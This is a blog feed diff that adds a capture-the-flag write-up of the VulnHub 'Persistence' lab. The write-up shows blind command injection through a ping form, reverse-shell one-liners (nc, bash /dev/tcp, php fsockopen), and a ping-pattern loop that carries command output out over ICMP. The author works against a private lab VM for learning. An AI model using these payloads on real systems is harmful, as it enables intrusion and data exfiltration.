@@ -4,7 +4,7 @@
   <title><![CDATA[#!/slash/note]]></title>
   <link href="http://leonjza.github.io/atom.xml" rel="self"/>
   <link href="http://leonjza.github.io/"/>
-  <updated>2014-08-17T16:21:58+02:00</updated>
+  <updated>2014-10-06T05:49:09+02:00</updated>
   <id>http://leonjza.github.io/</id>
   <author>
     <name><![CDATA[Leon Jacobs]]></name>
@@ -12,6 +12,1719 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[From Persistence, to pain, to PWN]]></title>
+    <link href="http://leonjza.github.io/blog/2014/09/18/from-persistence/"/>
+    <updated>2014-09-18T06:58:53+02:00</updated>
+    <id>http://leonjza.github.io/blog/2014/09/18/from-persistence</id>
+    <content type="html"><![CDATA[<h2>persist we must!</h2>
+
+<p>Persistence! A new boot2root hosted <a href="https://twitter.com/vulnhub">@VulnHub</a>, authored by <a href="https://twitter.com/superkojiman">@superkojiman</a> and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a <a href="http://blog.vulnhub.com/2014/09/competition-persistence.html">writeup competition</a> launched on September the 7th, and ran up until October th 5th.</p>
+
+<blockquote><p>Energy and persistence conquer all things.</p><footer><strong>Benjamin Franklin</strong></footer></blockquote>
+
+
+<p>This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!</p>
+
+<h2>lets get our hands dirty</h2>
+
+<p>As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.</p>
+
+<p>My VM got the IP 192.168.56.104, and the first Nmap result was:</p>
+
+<figure class='code'><figcaption><span>First Persistence Nmap</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap 192.168.56.104 --reason -sV -p-
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-09-18 07:01 SAST
+</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.104
+</span><span class='line'>Host is up, received reset <span class="o">(</span>0.0037s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: 65534 filtered ports
+</span><span class='line'>Reason: 65534 no-responses
+</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
+</span><span class='line'>80/tcp open  http    syn-ack nginx 1.4.7
+</span><span class='line'>
+</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 4131.90 seconds
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Not exactly much to work with, but its something at least! We know now that according to the web server banners, we are facing nginx. A welcome change to the usual apache stuff we see! A quick and nasty Google for nginx 1.4.7 exploits also did not return with any really interesting results. Not a problem really.</p>
+
+<p>Browsing to the site did not reveal anything interesting. A creepy image of melting clocks (what&hellip;) with the page sources serving it being minimal and uninteresting too. Manually poking about the web paths (for things like robots.txt etc) also did not reveal anything. The first hint however came when I fiddled with the index page location.</p>
+
+<p>By default, most web servers will serve the default index page when no location is specified from the web root. So, I tried <code>index.html</code>, and got the normal landing. When I requested <code>index.php</code> though, things changed drastically:</p>
+
+<figure class='code'><figcaption><span>PHP reveal</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -v 192.168.56.104/index.php
+</span><span class='line'>* About to connect<span class="o">()</span> to 192.168.56.104 port 80 <span class="o">(</span><span class="c">#0)</span>
+</span><span class='line'>*   Trying 192.168.56.104...
+</span><span class='line'>* connected
+</span><span class='line'>* Connected to 192.168.56.104 <span class="o">(</span>192.168.56.104<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
+</span><span class='line'>&gt; GET /index.php HTTP/1.1
+</span><span class='line'>&gt; User-Agent: curl/7.26.0
+</span><span class='line'>&gt; Host: 192.168.56.104
+</span><span class='line'>&gt; Accept: */*
+</span><span class='line'>
+</span><span class='line'>* additional stuff not fine transfer.c:1037: 0 0
+</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
+</span><span class='line'>&lt; HTTP/1.1 404 Not Found
+</span><span class='line'>&lt; Server: nginx/1.4.7
+</span><span class='line'>&lt; Date: Thu, 18 Sep 2014 07:28:18 GMT
+</span><span class='line'>&lt; Content-Type: text/html
+</span><span class='line'>&lt; Transfer-Encoding: chunked
+</span><span class='line'>&lt; Connection: keep-alive
+</span><span class='line'>&lt; X-Powered-By: PHP/5.3.3
+</span><span class='line'>
+</span><span class='line'>No input file specified.
+</span><span class='line'>
+</span><span class='line'>* Connection <span class="c">#0 to host 192.168.56.104 left intact</span>
+</span><span class='line'>* Closing connection <span class="c">#0</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As can be seen in the output above, the header <code>X-Powered-By: PHP/5.3.3</code> is now present, and the output <code>No input file specified.</code>. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.</p>
+
+<h2>finding that (de)bugger</h2>
+
+<p>With this information now gathered, it was time to pull out one of my favorite tools, <code>wfuzz</code>! With <code>wfuzz</code>, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.</p>
+
+<p>My first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending <em>.php</em> to my <code>FUZZ</code> keyword:</p>
+
+<figure class='code'><figcaption><span>discovering debug.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc 404 http://192.168.56.104/FUZZ.php
+</span><span class='line'>
+</span><span class='line'>********************************************************
+</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
+</span><span class='line'>********************************************************
+</span><span class='line'>
+</span><span class='line'>Target: http://192.168.56.104/FUZZ.php
+</span><span class='line'>Payload <span class="nb">type</span>: file,/usr/share/wordlists/wfuzz/general/medium.txt
+</span><span class='line'>
+</span><span class='line'>Total requests: <span class="nv">1660</span>
+</span><span class='line'><span class="o">==================================================================</span>
+</span><span class='line'>ID  Response   Lines      Word         Chars          <span class="nv">Request</span>
+</span><span class='line'><span class="o">==================================================================</span>
+</span><span class='line'>
+</span><span class='line'>00434:  <span class="nv">C</span><span class="o">=</span>200     12 L        28 W      357 Ch    <span class="s2">&quot; - debug&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Yay. <code>wfuzz</code> is stupidly fast and finished the above in like 4 seconds. Browsing to <a href="http://192.168.56.101/debug.php">http://192.168.56.101/debug.php</a> showed us a input field labeled &ldquo;Ping address:&rdquo; and a submit button</p>
+
+<p><img src="http://i.imgur.com/neKe18e.png"></p>
+
+<p>&ldquo;Command injection?&rdquo;, was the first thought here.</p>
+
+<h2>blind command injection</h2>
+
+<p>I started by entering a valid IP address that had <code>tcpdump</code> listening to test if the script is actually running a ping like it says &hellip;</p>
+
+<figure class='code'><figcaption><span>ping test</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# tcpdump icmp
+</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for </span>full protocol decode
+</span><span class='line'>listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 65535 bytes
+</span><span class='line'>07:46:15.503023 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 1, length 64
+</span><span class='line'>07:46:15.503040 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 1, length 64
+</span><span class='line'>07:46:16.503729 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 2, length 64
+</span><span class='line'>07:46:16.503768 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 2, length 64
+</span><span class='line'>07:46:17.503180 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 3, length 64
+</span><span class='line'>07:46:17.503260 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 3, length 64
+</span><span class='line'>07:46:18.502811 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 4, length 64
+</span><span class='line'>07:46:18.502842 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 4, length 64
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>&hellip; which it was. What is important to note here is that we have 4 echo requests.</p>
+
+<p>I then proceeded to modify the input attempting to execute other commands too. None of my attempts returned any output to the browser, however, sending the field <code>;exit 0;</code> caused the HTTP request to complete almost instantly while no ping requests were observed on the <code>tcpdump</code>. This had me certain that this field was vulnerable to a command injection vulnerability.</p>
+
+<p>This is all good, but not getting any output makes it really had to work with this. So, the next steps were to try and get a reverse/bind shell out of this command injection vulnerability.</p>
+
+<p>I tried the usual culprits: <code>nc &lt;ip&gt;  &lt;port&gt; -e /bin/bash</code>; <code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code>; <code>php -r '$sock=fsockopen("&lt;ip&gt;",&lt;port&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code>. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?</p>
+
+<h2>blind command injection &ndash; file enumeration</h2>
+
+<p>Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.</p>
+
+<p>I thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash <code>if [ -f /file ]</code> statement, with a single ping for success, and 2 pings for a failure. The string for the <code>debug.php</code> input field looked something like this:</p>
+
+<figure class='code'><figcaption><span>File existence check payload</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;</span><span class="k">if</span> <span class="o">[</span> -f /bin/sh <span class="o">]</span> <span class="p">;</span> <span class="k">then </span>ping 192.168.56.102 -c 1 <span class="p">;</span> <span class="k">else </span>ping 192.168.56.102 -c 2 <span class="p">;</span> <span class="k">fi</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Submitting the above input presented me with a single ping, confirming that <code>/bin/sh</code> exists.</p>
+
+<figure class='code'><figcaption><span>File existence response</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# tcpdump icmp
+</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for </span>full protocol decode
+</span><span class='line'>listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 65535 bytes
+</span><span class='line'>08:15:53.557994 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 63493, seq 1, length 64
+</span><span class='line'>08:15:53.558011 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 63493, seq 1, length 64
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Checking for something like <code>/bin/sh2</code> responded with 2 pings, as expected. Awesome. I can now enumerate the existence of files. The concept itself is probably pretty useless, however, if I can confirm the existence of something useful, such as <code>/bin/nc</code>, I may end up with greater success of a shell!</p>
+
+<p>I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless,  <code>/usr/bin/python</code> appeared to be available! I really like python so this had me really happy.</p>
+
+<h2>blind command injection &ndash; port scanner</h2>
+
+<p>I tested a few commands with <code>python -c</code>, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.</p>
+
+<p>No. Luck.</p>
+
+<p>I no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port &lsquo;prober&rsquo; so that I can try and determine which port is open outgoing. The idea was to watch my <code>tcpdump</code> for any tcp traffic comming from this host:</p>
+
+<figure class='code'><figcaption><span>probe.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">65535</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="s">&quot;192.168.56.102&quot;</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using my blind command injection, I echoed this content to <code>/tmp/probe.py</code> via the input field, and then in a subsequent request, ran it using <code>python /tmp/probe.py</code>. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open&hellip;</p>
+
+<h2>data exfiltration</h2>
+
+<p>With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the <code>debug.php</code> file on disk and tried to echo a PHP web shell to the same directory. This also failed.</p>
+
+<p>So, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.</p>
+
+<p>Eventually, I came across the <code>-p</code> argument for ping after reading <a href="http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html">this</a> blogpost. From <code>man 8 ping</code> we read:</p>
+
+<figure class='code'><figcaption><span>ping patterns</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>-p pattern
+</span><span class='line'>   You may specify up to 16 <span class="sb">``</span>pad<span class="s1">&#39;&#39;</span> bytes to fill out the packet you send.
+</span><span class='line'>   This is useful <span class="k">for </span>diagnosing data-dependent problems in a network.
+</span><span class='line'>   For example, <span class="sb">``</span>-p ff<span class="s1">&#39;&#39;</span> will cause the sent packet to be filled with all ones.
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So that changes things. I quickly confirmed that we have <code>xxd</code> available using my previous enumeration method and we did. Great.</p>
+
+<p>I fired up tcpdump with the <code>-X</code> flag to show me the packet contents, and tested it out with the following payload for the <code>id</code> command:</p>
+
+<figure class='code'><figcaption><span>Ping pattern `id` command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;</span>id<span class="p">|</span> xxd -p -c 16 <span class="p">|</span> <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span>ping -p <span class="nv">$line</span> -c 1 -q 192.168.56.102<span class="p">;</span> <span class="k">done</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On the <code>tcpdump</code> side of things&hellip;</p>
+
+<figure class='code'><figcaption><span>Ping pattern tcpdump</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop# tcpdump icmp -X
+</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for </span>full protocol decode
+</span><span class='line'>listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 65535 bytes
+</span><span class='line'>09:18:14.439222 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 6920, seq 1, length 64
+</span><span class='line'>    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
+</span><span class='line'>    0x0010:  c0a8 3866 0800 4b5b 1b08 0001 56a3 1a54  ..8f..K<span class="o">[</span>....V..T
+</span><span class='line'>    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx<span class="o">)</span>.guid<span class="o">=</span>
+</span><span class='line'>    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
+</span><span class='line'>    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
+</span><span class='line'>    0x0050:  3439 3828                                498<span class="o">(</span>
+</span><span class='line'>09:18:14.439248 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 6920, seq 1, length 64
+</span><span class='line'>    0x0000:  4500 0054 a049 0000 4001 e840 c0a8 3866  E..T.I..@..@..8f
+</span><span class='line'>    0x0010:  c0a8 3868 0000 535b 1b08 0001 56a3 1a54  ..8h..S<span class="o">[</span>....V..T
+</span><span class='line'>    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx<span class="o">)</span>.guid<span class="o">=</span>
+</span><span class='line'>    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
+</span><span class='line'>    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
+</span><span class='line'>    0x0050:  3439 3828                                498<span class="o">(</span>
+</span><span class='line'>09:18:14.440365 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 7176, seq 1, length 64
+</span><span class='line'>    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
+</span><span class='line'>    0x0010:  c0a8 3866 0800 318a 1c08 0001 56a3 1a54  ..8f..1.....V..T
+</span><span class='line'>    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx<span class="o">)</span>.grid<span class="o">=</span>4
+</span><span class='line'>    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
+</span><span class='line'>    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
+</span><span class='line'>    0x0050:  3938 286e                                98<span class="o">(</span>n
+</span><span class='line'>09:18:14.440382 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 7176, seq 1, length 64
+</span><span class='line'>    0x0000:  4500 0054 a04a 0000 4001 e83f c0a8 3866  E..T.J..@..?..8f
+</span><span class='line'>    0x0010:  c0a8 3868 0000 398a 1c08 0001 56a3 1a54  ..8h..9.....V..T
+</span><span class='line'>    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx<span class="o">)</span>.grid<span class="o">=</span>4
+</span><span class='line'>    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
+</span><span class='line'>    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
+</span><span class='line'>    0x0050:  3938 286e                                98<span class="o">(</span>n
+</span><span class='line'>09:18:14.441191 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 7432, seq 1, length 64
+</span><span class='line'>    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
+</span><span class='line'>    0x0010:  c0a8 3866 0800 ed92 1d08 0001 56a3 1a54  ..8f........V..T
+</span><span class='line'>    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .<span class="o">]</span>..<span class="o">(</span>nginx<span class="o">)</span>.oups
+</span><span class='line'>    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
+</span><span class='line'>    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
+</span><span class='line'>    0x0050:  3d34 <span class="nv">3938</span>                                <span class="o">=</span>498
+</span><span class='line'>09:18:14.441198 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 7432, seq 1, length 64
+</span><span class='line'>    0x0000:  4500 0054 a04b 0000 4001 e83e c0a8 3866  E..T.K..@..&gt;..8f
+</span><span class='line'>    0x0010:  c0a8 3868 0000 f592 1d08 0001 56a3 1a54  ..8h........V..T
+</span><span class='line'>    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .<span class="o">]</span>..<span class="o">(</span>nginx<span class="o">)</span>.oups
+</span><span class='line'>    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
+</span><span class='line'>    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
+</span><span class='line'>    0x0050:  3d34 <span class="nv">3938</span>                                <span class="o">=</span>498
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Mind. Blown.</p>
+
+<p>In case you don&rsquo;t see it, we have extracts of the <code>id</code> command in the request/response packets like <em>98(nginx).grid=4</em>. While this is not really fun to decipher, and with commands that produce a lot of output even worse, it was in fact <strong>something</strong> to work with!</p>
+
+<p>I fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.</p>
+
+<figure class='code'><figcaption><span>Scapy sniff()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s">&quot;icmp[icmptype] == 8 and host 192.168.56.104&quot;</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
+</span><span class='line'><span class="err">ؤ</span><span class="n">T</span><span class="err">�</span><span class="n">nginx</span><span class="p">)</span> <span class="n">guid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">guid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">guid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span>
+</span><span class='line'><span class="err">ؤ</span><span class="n">T</span>
+</span><span class='line'>   <span class="n">ginx</span><span class="p">)</span> <span class="n">grid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">grid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">grid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">n</span>
+</span><span class='line'><span class="err">ؤ</span><span class="n">T</span><span class="err">�</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span>
+</span><span class='line'><span class="n">oups</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span>
+</span><span class='line'><span class="n">oups</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span>
+</span><span class='line'><span class="n">oups</span><span class="o">=</span><span class="mi">498</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>sysadmin-tool</h2>
+
+<p>So with actual output to work with, I can almost say I have shell, however, it&rsquo;s crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.</p>
+
+<p>At one stage I ran <code>ls</code> as the command trying to see if there was anything in the web path that I may not have found yet. A file called <em>sysadmin-tool</em> was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through <code>strings</code>:</p>
+
+<figure class='code'><figcaption><span>sysadmin-tool strings</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
